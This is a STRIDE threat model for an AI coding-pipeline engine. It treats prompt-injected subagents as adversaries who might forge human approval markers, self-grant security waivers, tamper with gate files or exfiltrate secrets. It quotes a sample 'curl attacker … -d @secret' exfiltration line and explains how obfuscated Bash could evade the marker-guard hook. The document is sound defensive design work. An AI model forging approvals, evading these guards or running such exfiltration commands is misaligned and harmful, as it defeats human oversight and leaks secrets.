# Pipeline threat model — the engine as target (M9 / PR K)

**Scope: the pipeline *engine itself*, not the app it builds.** The application the
pipeline produces is threat-modeled per feature by planning's
`stride-threat-model-template` skill and reconciled against the built diff by the
security agent's step 6f. *This* document threat-models the **tooling** — the
orchestrator, subagents, `.pipeline/*` interlock files, deterministic hooks, and the
untrusted inputs the engine ingests — treating a prompt-injected or misbehaving
subagent as the adversary. Method: STRIDE (Shostack, *Threat Modeling*). Keep the two
scopes distinct; they are easy to re-conflate.

Companion to the code guards in `global-hooks/` and the permission model in
`.claude/settings.json` / `templates/project-settings.json`. Every threat below maps
to an **existing guard**, the **new PR K guard**, or a **stated accepted risk**.

## Step 1 — Assets and trust boundaries

**Assets**
- The two **human-owned approval markers** — `.pipeline/plan-approved` (plan
  checkpoint; implementation refuses to start without it) and `.pipeline/diff-approved`
  (M5 diff-review; the deploy gate's approval + currency anchor). Forging either forges
  a human decision.
- The **gate-input files** — `test-results.json`, `security-status.json`,
  `pr-description.md` — read by `deployment-gate.sh`.
- The **deterministic hooks** themselves (the enforcement layer).
- **GitHub push/PR authority** (held by the deployment stage) and the developer's
  machine secrets (the Claude Code credential in `~/.claude`, any `.env`).
- The **code, tests, and docs** the pipeline emits.

**Trust boundaries** (threats live here)
1. **Human ↔ orchestrator (main thread)** — the human drives and is trusted; the
   main thread is *not* gated by agent PreToolUse hooks (only subagents are).
2. **Orchestrator ↔ subagent** — each subagent starts with fresh context + a prompt
   string. It is *semi-trusted*: correct by construction, but **steerable by its
   inputs** (prompt injection).
3. **Subagent ↔ `.pipeline/*` shared state** — subagents read/write these files; the
   gates read them. A subagent writing a file it has no business writing is the core
   tampering/spoofing surface.
4. **Subagent ↔ deterministic hooks** — hooks are trusted, fail-closed enforcement.
5. **Pipeline ↔ untrusted external input** — `PROJECT.md`, cloned-repo code + READMEs,
   dependency registry/README text (`plan-audit` curls npm/PyPI; `security` reads
   dependency metadata), and screenshots (if vision is used). All are **data an agent
   reads**, and all are potential prompt-injection carriers.
6. **Pipeline ↔ GitHub** — the deployment stage commits, pushes, and opens the PR.

## Step 2 — STRIDE enumeration

| Category | Boundary / Asset | Attack vector | Sev | Mitigation → guard or gap |
|---|---|---|---|---|
| **Spoofing** | Subagent → approval markers | A Bash-capable subagent (esp. deployment) writes `.pipeline/diff-approved`, or plan-audit/implementation writes `.pipeline/plan-approved`, or the design-spec agent writes `.pipeline/design-approved` (or `waivers.json`), forging the human's approval and bypassing a checkpoint | **H** | `approve-diff.sh` TTY-only (no approval *via the helper*); human-approves-first ordering; explicit agent prohibition; `guard-approval-markers.sh` PreToolUse Bash hook on all 7 Bash agents (blocks marker *writes*); settings `deny` on `Write`/`Edit` of every human-owned marker (design-spec has no Bash, so the deny is its whole guard). Residual: obfuscated Bash (below). |
| **Spoofing** | Subagent → gate-status files | A late-running agent (e.g. documentation, after security) writes `security-status.json`=`clean` / a passing `test-results.json` it didn't earn | **M** | The owning agent legitimately writes these (a blunt guard would false-positive), so mitigated by orchestrator ordering + `stamp-ran-at.sh` (real UTC `ran_at`) + the harness-pinned loop-exit≡gate invariant; residual accepted (below). |
| **Spoofing / EoP** | Subagent → security waivers | The security agent writes an `osv_waiver` (lifts the CVE floor) or an `asvs.waivers` entry (lifts the ASVS floor) into `security-status.json` that **no human accepted** — self-waiving past a deterministic gate | **M–H** | **NEW Option B:** waivers are recorded only by a human via `record-waiver.sh` (TTY-only) into `.pipeline/waivers.json`; `guard-approval-markers.sh` + settings `deny` block agent writes to it; **`deployment-gate.sh` blocks any claimed `osv_waiver`/`asvs.waivers` with no matching human record** (deploy-only; `tests/suites/waiver-guard.sh`). Residual: the agent can still *under-report* a finding (omit a miss rather than fabricate a waiver) — closed per-requirement by the **ASVS-determinism roadmap** (Tier 1 SAST / Tier 2 required-tests), not the waiver path. |
| **Tampering** | Untrusted input → downstream agent | Hostile text in `PROJECT.md` / a cloned README / a dependency README / **a design bundle (screenshot text, exported HTML comment, Figma layer name) / an MCP result** instructs an agent to weaken a test, widen scope, skip a mitigation, or exfiltrate | **H** | **Three human checkpoints** (design-approved after reading the design-spec + its injection report; plan-approved after plan + plan-audit; diff-approved after the diff + `/code-review` + reports); **deterministic gates, never LLM-judged**; the **"untrusted input = data, not instructions" convention** (pipeline-orchestration skill, extended to image/HTML/MCP carriers) with the **design-spec agent's injection report** quoting embedded imperatives as NOT ACTED ON; plan-audit ambiguity flags; security 6f surface reconciliation. Residual: a subtle injection surviving human review. |
| **Tampering** | Subagent → gate inputs | Editing `test-results.json` perf/criteria to score a criterion complete without exercising it | **M** | Deterministic **perf-pairing + criteria-coverage** gate (PR G), `stamp-ran-at.sh`, and the loop-exit≡gate invariant test (a declared budget with a null measured value never passes). |
| **Repudiation** | Subagent action trail | An agent acts with no record | **L** | `log-run.sh` Stop hook on all 9 agents (incl. the conditional design-spec stage) → `run-log.jsonl`; the single git commit is attributable. |
| **Info disclosure** | Injected egress / secret read | Injected `curl attacker … -d @secret`, or reading `.env` | **M** | `deny(Read(**/.env))` + `*.tfvars`/`*.tfstate`; **no secrets in the working tree** (the Claude credential lives in `~/.claude`, outside the repo); deployment's pre-commit secret scan; logging PII redaction; **EG: a default-deny allow-listed egress control** (`egress-allowlist.txt` + a Layer-2 forward proxy the operator provisions, `global-hooks/egress-proxy/`) with **denied-attempt detection** (`egress-check.sh` → security warning). Residual narrows to "a legitimately allow-listed host (a permitted registry) is itself abused as the exfil channel" — much smaller; and, until the operator provisions the proxy, the accepted "nothing sensitive in-tree" basis still holds. |
| **Info disclosure** | Non-allow-listed egress (EG) | An injected agent/tool tries to reach a host the pipeline has no reason to touch (phone-home / payload fetch) | **M** | **Default-deny egress:** the enumerated `egress-allowlist.txt`; the Layer-2 proxy denies everything else (scanner containers on a restricted Docker network; `HTTPS_PROXY` for host commands); **Layer-3 `egress-check.sh` surfaces every denied host** as a security-report warning. WSL2/Linux nftables is the strong-guarantee substrate. `api.anthropic.com` (model transport) is out of scope. |
| **Info disclosure** | Pipeline → GitHub | A secret/junk file committed into the PR | **M** | Deployment **pre-commit content inspection** (`deployment-checklist-and-rollback` skill grep set) + GitHub secret-scanning/push-protection (repo hygiene). |
| **DoS** | Debug/scan/test loop | A failing feature loops forever, burning the model budget | **L–M** | `loop-guard.sh` circuit-breaker (cycle + wall-clock caps → terminal `capped`, human escalation, never auto-cleared) + per-agent `maxTurns`. |
| **Elevation of privilege** | Subagent out of lane | testing edits prod code; deployment bypasses the gate to self-authorize a deploy | **M** | Per-agent **tool scoping** (deployment has *only* Bash); `deployment-gate.sh` fail-closed PreToolUse; the marker guard closes deployment's self-approval path specifically. |

## Step 3 — Severity rubric

- **High** — high impact (a forged human approval ships unreviewed code; an injection
  weakens a real mitigation) with a plausible vector. Must be mitigated.
- **Medium** — meaningful impact but constrained likelihood, or limited impact with an
  easy vector. Mitigate or consciously accept.
- **Low** — minor impact or remote likelihood. Note and move on.

## Verification status (both marker-guard vectors)

- **Bash vector** — `guard-approval-markers.sh` is covered by `tests/suites/marker-guard.sh`
  (29 assertions: write-shapes blocked; reads + real command sets allowed; a wiring check
  that all 7 Bash agents actually wire it). Green in `tests/run-eval.sh`.
- **`Write`/`Edit` deny vector** — **verified live** (2026-07-02): a `Write` to
  `.pipeline/diff-approved`, `.pipeline/plan-approved`, `.pipeline/design-approved`, and
  `.pipeline/waivers.json` is blocked by the permission layer, while a `Write` to a non-marker
  `.pipeline/` path (e.g. `design-spec.md`) succeeds — so the deny is **precisely scoped to the
  human-owned markers** and does not impede legitimate agent artifacts
  (`test-results.json`, `security-status.json`, `plan.md`, …). Note: settings changes load at
  session start, so after editing the deny, restart the session for it to take effect.

## Step 4 — Accepted risks / residual (stated, not hidden)

- **Obfuscated Bash past `guard-approval-markers.sh`.** The hook is a string scanner; a
  determined, injected agent could build the marker path from a variable, `$()`, or
  base64 and slip past it. The **`Write`/`Edit` deny is not obfuscatable**, and a forged
  `diff-approved` still has to match the deploy gate's currency hash *and* beat the
  human-approves-first ordering. Net: the bar moves from "just write the file" to
  "defeat two independent guards, one of them tool-level, while also matching the hash
  and the ordering." Accepted.
- **Cross-stage gate-status forgery.** `security-status.json` / `test-results.json` are
  legitimately written by their owning stage, so they cannot be blanket-guarded without
  false-positives. Mitigated by ordering, `ran_at` stamping, and the loop-exit≡gate
  invariant; the residual (a same-stage-shaped forgery by a later agent) is accepted.
- **Registry/WebFetch egress — narrowed 2026-07-10 (#39), residual accepted.** Formerly
  "curl egress is unrestricted (plan-audit needs it for registry reality-checks)"; now
  plan-audit's registry reality-check goes through `registry-check.sh` (a scoped npm/PyPI
  wrapper — no bare-curl verb in the skill), and WebFetch is domain-allowlisted
  **deny-not-prompt** via `guard-webfetch-domains.sh` + `webfetch-domains.txt` (fails
  closed; fragment-planted `@` bypass regression-tested).
- **MITIGATED (2026-07-13, post-canary):** shell egress is now **proxy-ENFORCED** on the
  WSL2 pipeline host — default-deny tinyproxy, ACL derived from `egress-allowlist.txt`,
  reconciled against a real run's log-only record, flipped via
  `setup-wsl-pipeline.sh --enforce`, and `verify-sandbox.sh` reports `SANDBOX OK`
  (allowlisted host passes AND a non-allowlisted host is refused AND the harness
  completes a live round-trip through the filter). "Unrestricted curl egress" is no
  longer an accepted residual on the sandboxed host. Remaining, stated residuals:
  (a) an **allowlisted receiver that accepts a tenant credential** (api.anthropic.com,
  github.com) is a bounded exfil channel — irreducible while those services are the
  pipeline's function; multi-tenant generic receivers (e.g. the Datadog log intake) are
  deliberately denied for exactly this reason; (b) **WebSearch query-string leakage**
  (accepted — search is allowlisted, queries can carry short strings out);
  (c) **notification payloads** cross ntfy/toast and are capped by the payload rule to
  event kind + feature slug + repo name, never run content; (d) Windows-host
  (non-sandboxed) runs keep only the env-var-honoring proxy posture — the enforcement
  claim is WSL-host-only. The sandbox is still deliberately **not a preflight gate**
  (prove-then-codify: one enforced canary run is the current evidence base;
  `check-run-host.sh` surfaces the tier at every kickoff).
- **Subtle prompt injection surviving the human checkpoints** (design-approved, plan-approved,
  diff-approved)**.** The human review is the
  backstop; this residual is inherent to an LLM pipeline and is why the *deterministic*
  gates never delegate a pass/fail to model judgement.
- **No per-agent filesystem sandbox** (SDK-level, out of scope) — **but the blast radius
  is now the WSL2 userland**, not the operator's Windows profile: runs execute on the
  native WSL filesystem (`check-run-host.sh` verifies), holding only a repo-scoped
  fine-grained PAT (write-probed: denied outside its grant), with no `~/.ssh`/`~/.aws`
  present (`verify-sandbox.sh` asserts). Escape ⇒ a disposable Linux home + one
  low-value token, re-provisionable by one script.

## Threat-model diagram (pipeline DFD)

```mermaid
flowchart TD
    subgraph human_zone[Trusted: human + main thread]
        H[Human / orchestrator\nmain thread — un-hooked]
    end
    subgraph agent_zone[Semi-trusted: subagents · steerable by inputs]
        SA[(Subagents\nplanning … deployment)]
    end
    subgraph state_zone[.pipeline/* shared state]
        MARK[["⚠ design-approved / plan-approved / diff-approved · waivers.json\nHUMAN-OWNED markers"]]
        GST[(gate-status files\ntest-results · security-status · pr-description)]
    end
    subgraph enforce[Trusted enforcement — fail closed]
        HOOKS{{Deterministic hooks\ndeployment-gate · loop-guard · stamp-ran-at\n⚠ guard-approval-markers PR K}}
    end
    EXT["⚠ Untrusted inputs\nPROJECT.md · cloned repos · dep READMEs · design bundles/screenshots · MCP results"]
    GH([GitHub PR])

    H -->|touch plan-approved / approve-diff.sh| MARK
    EXT -->|read as DATA, not instructions| SA
    SA -->|writes results| GST
    SA -.->|"⚠ forge attempt (blocked: hook + deny)"| MARK
    HOOKS -->|reads, gates on| MARK
    HOOKS -->|reads, gates on| GST
    SA -->|commit + push + PR\nafter gate passes| GH
    HOOKS -.->|blocks unless every condition met| SA
```

## Copy-paste visualization prompt

```text
Assets: design-approved, plan-approved and diff-approved (human-owned approval markers) +
waivers.json (human-owned security waivers); gate-status
files (test-results.json, security-status.json, pr-description.md); deterministic
hooks; GitHub push/PR authority; machine secrets (~/.claude, .env); emitted code.
Trust boundaries: human↔orchestrator; orchestrator↔subagent (subagents are steerable
by inputs); subagent↔.pipeline/* files; subagent↔hooks (fail-closed); pipeline↔
untrusted input (PROJECT.md, cloned repos, dependency READMEs, design bundles/screenshots,
MCP results); pipeline↔GitHub.
STRIDE:
- Spoofing (High): a Bash subagent forges design-approved/plan-approved/diff-approved (or
  waivers.json) to bypass a human checkpoint. Mitigation: approve-diff.sh TTY-only;
  human-approves-first ordering; guard-approval-markers.sh PreToolUse hook blocks marker
  writes; settings deny on Write/Edit of the markers.
- Tampering (High): prompt injection via untrusted input steers a downstream agent.
  Mitigation: three human checkpoints; deterministic (never LLM-judged) gates; the
  design-spec injection report; treat untrusted input as data not instructions.
- Repudiation (Low): run-log.jsonl + single git commit.
- Information disclosure (Medium): injected egress / .env read. Mitigation: .env
  read-deny; no secrets in the working tree; deployment pre-commit secret scan;
  default-deny egress allowlists (EG proxy + WebFetch domain guard + scoped registry
  wrapper, #39).
- Denial of service (Low-Med): runaway loop. Mitigation: loop-guard circuit-breaker +
  maxTurns caps.
- Elevation of privilege (Medium): agent out of lane / deployment self-authorizing.
  Mitigation: per-agent tool scoping; fail-closed deployment gate; the marker guard.
Accepted residual: obfuscated Bash past the string scanner; cross-stage gate-status
forgery; credentialed allowlisted-receiver egress abuse (shell egress proxy-ENFORCED
default-deny on the WSL host since 2026-07-13; WebFetch domain-denied); WebSearch
query-string leakage; subtle injection surviving human review; per-agent filesystem
isolation is host-level (WSL2 disposable userland + repo-scoped PAT), not per-subagent.
Render this as an OWASP Threat Dragon diagram. Output either (a) valid Threat Dragon
JSON importable at app.threatdragon.com, or (b) a labeled data flow diagram with trust
boundaries if JSON is not feasible. No additional context is available beyond what is in
this prompt.
```
